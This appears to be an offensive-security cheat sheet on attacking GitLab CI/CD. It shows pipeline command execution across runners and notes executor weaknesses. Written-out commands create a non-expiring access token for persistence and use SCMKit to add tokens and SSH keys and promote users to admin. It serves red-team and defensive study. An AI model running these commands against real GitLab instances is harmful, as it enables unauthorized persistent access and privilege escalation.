# CI/CD - Gitlab CI

GitLab CI (Continuous Integration) is a built-in feature of GitLab that automates the process of building, testing, and deploying your code every time you make a change. It's part of GitLab CI/CD, which stands for Continuous Integration / Continuous Deployment.

## Gitlab Runners

```ps1
sudo apt-get install gitlab-runner
sudo gitlab-runner register
```

| Prompt              | Example Input                                            |
| ------------------- | -------------------------------------------------------- |
| GitLab instance URL | `https://gitlab.com/`                                    |
| Registration token  | Found in your project under `Settings > CI/CD > Runners` |
| Executor            | `shell`, `docker`, etc.                                  |
| Description         | `my-remote-runner`                                       |
| Tags                | `remote`                                                 |

The `.gitlab-ci.yml` file is the configuration file that GitLab CI/CD uses to define your pipelines, jobs, and stages.

### Command Execution Jobs

Gitlab-CI "Command Execution" example: `.gitlab-ci.yml`

```yaml
stages:
    - test

test:
    stage: test
    script:
        - |
            whoami
    parallel:
        matrix:
            - RUNNER: VM1
            - RUNNER: VM2
            - RUNNER: VM3
    tags:
        - ${RUNNER}
```

### List GitLab Runners

List all GitLab runners available to the current user in GitLab.

```ps1
SCMKit.exe -s gitlab -m listrunner -c userName:password -u https://gitlab.something.local
SCMKit.exe -s gitlab -m listrunner -c apikey -u https://gitlab.something.local
```

## Gitlab Executors

* **Shell** executor: The jobs are run with the permissions of the GitLab Runner’s user and can steal code from other projects that are run on this server.
* **Docker** executor: Docker can be considered safe when running in non-privileged mode.
* **SSH** executor: SSH executors are susceptible to MITM attack (man-in-the-middle), because of missing `StrictHostKeyChecking` option.

## Gitlab CI/CD Variables

CI/CD Variables are a convenient way to store and use data in a CI/CD pipeline, but variables are less secure than secrets management providers.

## Persistence

* [xforcered/SCMKit](https://github.com/xforcered/SCMKit) - Source Code Management Attack Toolkit

### Personal Access Token

Create a PAT (Personal Access Token) as a persistence mechanism for the Gitlab instance.

* Manual

    ```ps1
    curl -k --request POST --header "PRIVATE-TOKEN: apiToken" --data "name=user-persistence-token" --data "expires_at=" --data "scopes[]=api" --data "scopes[]=read_repository" --data "scopes[]=write_repository" "https://gitlabHost/api/v4/users/UserIDNumber/personal_access_tokens"
    ```

* Using `SCMKit.exe`: Create/List/Delete an access token to be used in a particular SCM system

    ```ps1
    SCMKit.exe -s gitlab -m createpat -c userName:password -u https://gitlab.something.local -o targetUserName
    SCMKit.exe -s gitlab -m createpat -c apikey -u https://gitlab.something.local -o targetUserName
    SCMKit.exe -s gitlab -m removepat -c userName:password -u https://gitlab.something.local -o patID
    SCMKit.exe -s gitlab -m listpat -c userName:password -u https://gitlab.something.local -o targetUser
    SCMKit.exe -s gitlab -m listpat -c apikey -u https://gitlab.something.local -o targetUser
    ```

* Get the assigned privileges to an access token being used in a particular SCM system

    ```ps1
    SCMKit.exe -s gitlab -m privs -c apiKey -u https://gitlab.something.local
    ```

### SSH Keys

* Create/List an SSH key to be used in a particular SCM system

    ```ps1
    SCMKit.exe -s gitlab -m createsshkey -c userName:password -u https://gitlab.something.local -o "ssh public key"
    SCMKit.exe -s gitlab -m createsshkey -c apiToken -u https://gitlab.something.local -o "ssh public key"
    SCMKit.exe -s gitlab -m listsshkey -c userName:password -u https://github.something.local
    SCMKit.exe -s gitlab -m listsshkey -c apiToken -u https://github.something.local
    SCMKit.exe -s gitlab -m removesshkey -c userName:password -u https://gitlab.something.local -o sshKeyID
    SCMKit.exe -s gitlab -m removesshkey -c apiToken -u https://gitlab.something.local -o sshKeyID
    ```

### User Promotion

* Promote a normal user to an administrative role in a particular SCM system

    ```ps1
    SCMKit.exe -s gitlab -m addadmin -c userName:password -u https://gitlab.something.local -o targetUserName
    SCMKit.exe -s gitlab -m addadmin -c apikey -u https://gitlab.something.local -o targetUserName
    SCMKit.exe -s gitlab -m removeadmin -c userName:password -u https://gitlab.something.local -o targetUserName
    ```

## Tools

* [praetorian-inc/glato](https://github.com/praetorian-inc/glato) - GitLab Attack TOolkit

## References

* [Security for self-managed runners - Gitlab](https://docs.gitlab.com/runner/security/)
